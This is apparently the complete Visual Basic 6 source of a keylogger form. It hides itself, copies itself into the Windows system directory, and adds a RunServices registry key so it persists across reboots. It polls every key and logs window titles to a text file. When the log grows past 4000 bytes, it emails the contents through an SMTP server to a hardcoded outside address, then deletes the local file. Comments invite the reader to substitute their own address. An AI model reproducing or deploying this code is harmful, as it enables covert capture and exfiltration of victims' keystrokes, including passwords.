VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   3930
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6570
   Icon            =   "Keylog.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3930
   ScaleWidth      =   6570
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.TextBox txtstatus 
      Height          =   1215
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Text            =   "Keylog.frx":0ABA
      Top             =   1680
      Width           =   6375
   End
   Begin VB.TextBox Text2 
      Height          =   855
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Text            =   "Keylog.frx":0ACF
      Top             =   3000
      Width           =   6375
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Resume"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   0
      Width           =   6375
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1245
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      TabStop         =   0   'False
      Text            =   "Keylog.frx":0AF1
      Top             =   360
      Width           =   6345
   End
   Begin VB.Timer Timer2 
      Interval        =   25000
      Left            =   0
      Top             =   360
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'*** Coded by moccasin (ymoccasin@hotmail.com) - Jamal
'*** Help and Code from some chinese kid's keylogger on psc
'(I think his name was Kim Jhoo or somethin)

Private Declare Function Getasynckeystate Lib "user32" Alias "GetAsyncKeyState" (ByVal VKEY As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegisterServiceProcess Lib "Kernel32.dll" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cX As Long, ByVal cY As Long, ByVal wFlags As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer$, nSize As Long) As Long
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Const VK_CAPITAL = &H14
Const REG As Long = 1
Const HKEY_LOCAL_MACHINE As Long = &H80000002
Const HWND_TOPMOST = -1

Const SWP_NOMOVE = &H2
Const SWP_NOSIZE = &H1

Const flags = SWP_NOMOVE Or SWP_NOSIZE
Dim currentwindow As String
Dim logfile As String

Public Function CAPSLOCKON() As Boolean
Static bInit As Boolean
Static bOn As Boolean
If Not bInit Then
While Getasynckeystate(VK_CAPITAL)
Wend
bOn = GetKeyState(VK_CAPITAL)
bInit = True
Else
If Getasynckeystate(VK_CAPITAL) Then
While Getasynckeystate(VK_CAPITAL)
DoEvents
Wend
bOn = Not bOn
End If
End If
CAPSLOCKON = bOn
End Function

Private Sub Command1_Click()
Form1.Visible = False
End Sub


Private Sub Form_Load()
'first check to see if the app is already running

    If App.PrevInstance Then
        Unload Me
        End
    End If
   
   HideMe

    'subclass the handle
    'to be ready for a connection
   Hook Me.hWnd
 
Dim mypath, newlocation As String, u

'if you see a bunch of initial characters like
'abcdefg... in the log when this starts up its normal. heh.

'FormOntop Me
    
    
currentwindow = GetCaption(GetForegroundWindow)
'gets caption of current window

mypath = App.Path & "\" & App.EXEName & ".EXE"  'the name of app
newlocation = Environ("WinDir") & "\system\" & App.EXEName & ".EXE" 'new location
On Error Resume Next
If LCase(mypath) <> LCase(newlocation) Then
FileCopy mypath, newlocation
End If

u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices", 0, KEY_ALL_ACCESS, a)
u = RegSetValueExA(a, App.EXEName, 0, REG, newlocation, 1)
u = RegCloseKey(a)

'that will  copy the keylog.exe to the windows system directory
'and run this program from the registry everytime windows starts up.

logfile = Environ("WinDir") & "\system\" & App.EXEName & ".TXT"  'this points to the log file, you may change it

' this makes the logfile the same name as this app,
' except *.txt, however you may rename it something else if you want

Open logfile For Append As #1
'starts logging to log file
Write #1, vbCrLf
Write #1, "[Log Start: " & Now & "]" 'tells when the log started
Write #1, String$(50, "-")
Close #1
End Sub

Private Sub Form_Unload(Cancel As Integer)
    UnHook Me.hWnd
    'lets unhook the hwnd so we dont
    'get an error

texter$ = Text1
Open logfile For Append As #1
Write #1, texter
Write #1, String$(50, "-")
Write #1, "[Log End: " & Now & "]" 'tells when the log ended
Close #1
End Sub

Private Sub Timer1_Timer()

If currentwindow <> GetCaption(GetForegroundWindow) Then
'if the foreground window is different from the currentwindow
'then the window has changed
currentwindow = GetCaption(GetForegroundWindow)
'updates currentwindow to the actual current foreground window
Text1 = Text1 & vbCrLf & vbCrLf & "[" & Time & " - Current Window: " & currentwindow & "]" & vbCrLf
'note the change in text1
End If

'the following gets the keys pressed and stores it in text1

'press shift + f12 to get the form visible
Dim keystate As Long
Dim Shift As Long
Shift = Getasynckeystate(vbKeyShift)

keystate = Getasynckeystate(vbKeyA)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "A"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "a"
End If

keystate = Getasynckeystate(vbKeyB)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "B"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "b"
End If

keystate = Getasynckeystate(vbKeyC)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "C"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "c"
End If

keystate = Getasynckeystate(vbKeyD)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "D"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "d"
End If

keystate = Getasynckeystate(vbKeyE)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "E"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "e"
End If

keystate = Getasynckeystate(vbKeyF)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "F"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "f"
End If

keystate = Getasynckeystate(vbKeyG)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "G"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "g"
End If

keystate = Getasynckeystate(vbKeyH)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "H"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "h"
End If

keystate = Getasynckeystate(vbKeyI)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "I"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "i"
End If

keystate = Getasynckeystate(vbKeyJ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "J"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "j"
End If

keystate = Getasynckeystate(vbKeyK)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "K"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "k"
End If

keystate = Getasynckeystate(vbKeyL)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "L"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "l"
End If


keystate = Getasynckeystate(vbKeyM)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "M"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "m"
End If


keystate = Getasynckeystate(vbKeyN)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "N"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "n"
End If

keystate = Getasynckeystate(vbKeyO)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "O"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "o"
End If

keystate = Getasynckeystate(vbKeyP)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "P"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "p"
End If

keystate = Getasynckeystate(vbKeyQ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "Q"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "q"
End If

keystate = Getasynckeystate(vbKeyR)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "R"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "r"
End If

keystate = Getasynckeystate(vbKeyS)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "S"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "s"
End If

keystate = Getasynckeystate(vbKeyT)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "T"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "t"
End If

keystate = Getasynckeystate(vbKeyU)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "U"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "u"
End If

keystate = Getasynckeystate(vbKeyV)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "V"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "v"
End If

keystate = Getasynckeystate(vbKeyW)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "W"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "w"
End If

keystate = Getasynckeystate(vbKeyX)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "X"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "x"
End If

keystate = Getasynckeystate(vbKeyY)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "Y"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "y"
End If

keystate = Getasynckeystate(vbKeyZ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "Z"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "z"
End If

keystate = Getasynckeystate(vbKey1)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "1"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "!"
End If


keystate = Getasynckeystate(vbKey2)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "2"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "@"
End If


keystate = Getasynckeystate(vbKey3)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "3"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "#"
End If


keystate = Getasynckeystate(vbKey4)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "4"
      End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "$"
End If


keystate = Getasynckeystate(vbKey5)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "5"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "%"
End If


keystate = Getasynckeystate(vbKey6)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "6"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "^"
End If


keystate = Getasynckeystate(vbKey7)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "7"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "&"
End If

   
   keystate = Getasynckeystate(vbKey8)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "8"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "*"
End If

   
   keystate = Getasynckeystate(vbKey9)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "9"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "("
End If

   
   keystate = Getasynckeystate(vbKey0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "0"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + ")"
End If

   
   keystate = Getasynckeystate(vbKeyBack)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{bkspc}"
     End If
   
   keystate = Getasynckeystate(vbKeyTab)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{tab}"
     End If
   
   keystate = Getasynckeystate(vbKeyReturn)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + vbCrLf
     End If
   
   keystate = Getasynckeystate(vbKeyShift)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{shift}"
     End If
   
   keystate = Getasynckeystate(vbKeyControl)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{ctrl}"
     End If
   
   keystate = Getasynckeystate(vbKeyMenu)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{alt}"
     End If
   
   keystate = Getasynckeystate(vbKeyPause)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{pause}"
     End If
   
   keystate = Getasynckeystate(vbKeyEscape)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{esc}"
     End If
   
   keystate = Getasynckeystate(vbKeySpace)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + " "
     End If
   
   keystate = Getasynckeystate(vbKeyEnd)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{end}"
     End If
   
   keystate = Getasynckeystate(vbKeyHome)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{home}"
     End If

keystate = Getasynckeystate(vbKeyLeft)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{left}"
     End If

keystate = Getasynckeystate(vbKeyRight)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{right}"
     End If

keystate = Getasynckeystate(vbKeyUp)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{up}"
     End If
   
   keystate = Getasynckeystate(vbKeyDown)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{down}"
     End If

keystate = Getasynckeystate(vbKeyInsert)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{insert}"
     End If

keystate = Getasynckeystate(vbKeyDelete)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{Delete}"
     End If

keystate = Getasynckeystate(&HBA)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + ";"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + ":"
  
      End If
     
keystate = Getasynckeystate(&HBB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "="
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "+"
     End If

keystate = Getasynckeystate(&HBC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + ","
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "<"
     End If

keystate = Getasynckeystate(&HBD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "-"
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "_"
     End If

keystate = Getasynckeystate(&HBE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "."
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + ">"
     End If

keystate = Getasynckeystate(&HBF)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "/"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "?"
     End If

keystate = Getasynckeystate(&HC0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "`"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "~"
     End If

keystate = Getasynckeystate(&HDB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "["
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{"
     End If

keystate = Getasynckeystate(&HDC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "\"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "|"
     End If

keystate = Getasynckeystate(&HDD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "]"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "}"
     End If

keystate = Getasynckeystate(&HDE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "'"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + Chr$(34)
     End If

keystate = Getasynckeystate(vbKeyMultiply)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "*"
     End If

keystate = Getasynckeystate(vbKeyDivide)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "/"
     End If

keystate = Getasynckeystate(vbKeyAdd)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "+"
     End If
   
keystate = Getasynckeystate(vbKeySubtract)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "-"
     End If
   
keystate = Getasynckeystate(vbKeyDecimal)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{Del}"
     End If
     
   keystate = Getasynckeystate(vbKeyF1)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F1}"
     End If
   
   keystate = Getasynckeystate(vbKeyF2)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F2}"
     End If
   
   keystate = Getasynckeystate(vbKeyF3)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F3}"
     End If
   
   keystate = Getasynckeystate(vbKeyF4)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F4}"
     End If
   
   keystate = Getasynckeystate(vbKeyF5)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F5}"
     End If
   
   keystate = Getasynckeystate(vbKeyF6)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F6}"
     End If
   
   keystate = Getasynckeystate(vbKeyF7)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F7}"
     End If
   
   keystate = Getasynckeystate(vbKeyF8)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F8}"
     End If
   
   keystate = Getasynckeystate(vbKeyF9)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F9}"
     End If
   
   keystate = Getasynckeystate(vbKeyF10)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F10}"
     End If
   
   keystate = Getasynckeystate(vbKeyF11)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F11}"
     End If
   
   keystate = Getasynckeystate(vbKeyF12)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F12}"
     End If
     
If Shift <> 0 And (keystate And &H1) = &H1 Then
   Form1.Visible = True
     End If
         
    keystate = Getasynckeystate(vbKeyNumlock)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{NumLock}"
     End If
     
     keystate = Getasynckeystate(vbKeyScrollLock)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{ScrollLock}"
         End If
   
    keystate = Getasynckeystate(vbKeyPrint)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{PrintScreen}"
         End If
       
       keystate = Getasynckeystate(vbKeyPageUp)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{PageUp}"
         End If
       
       keystate = Getasynckeystate(vbKeyPageDown)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{Pagedown}"
         End If

         keystate = Getasynckeystate(vbKeyNumpad1)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "1"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad2)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "2"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad3)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "3"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad4)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "4"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad5)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "5"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad6)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "6"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad7)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "7"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad8)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "8"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad9)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "9"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad0)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "0"
         End If
         
End Sub
Private Sub Timer2_Timer()
'this timer interval is set to 25000 so it writes the logged keys
'to the file and checks file size every 25 seconds

Dim lfilesize As Long, txtlog As String, success As Integer
Dim from As String, name As String
Open logfile For Append As #1
'writes the the contents of text1 (the logged keys) to the
'logfile
Write #1, Text1
Close #1

Text1.Text = ""
'clears the text1 so it wont take up that much memory
lfilesize = FileLen(logfile) 'this gets the length of the log file

If lfilesize >= 4000 Then
'if the size of the log file is greater than 4000 bytes then
Text2 = ""

inform

Open logfile For Input As #1
While Not EOF(1)
Input #1, txtlog
DoEvents
Text2 = Text2 & vbCrLf & txtlog
'gets the contents in the log file and store it in text2
Wend
Close #1

txtstatus = ""

 'open socket
    Call StartWinsock("")

success = smtp("mail.hotmail.com", "25", "logfile@email.com", "hungry_305@hotmail.com", "log file", "HUNGRY", "log@email.com", "l o g f i l e", Text2)
'sends the contents of the text2 to hungry_305@hotmail.com
'change the address,mail server, etc. to befit you

If success = 1 Then
Kill logfile
'if the mailing attempt was a success then delete the current
'log file to free diskspace,
'a new one will be started by the append
End If
  'lets close the connection
    Call closesocket(mysock)
End If

End Sub

Public Sub FormOntop(FormName As Form)
    Call SetWindowPos(FormName.hWnd, HWND_TOPMOST, 0&, 0&, 0&, 0&, flags)
End Sub
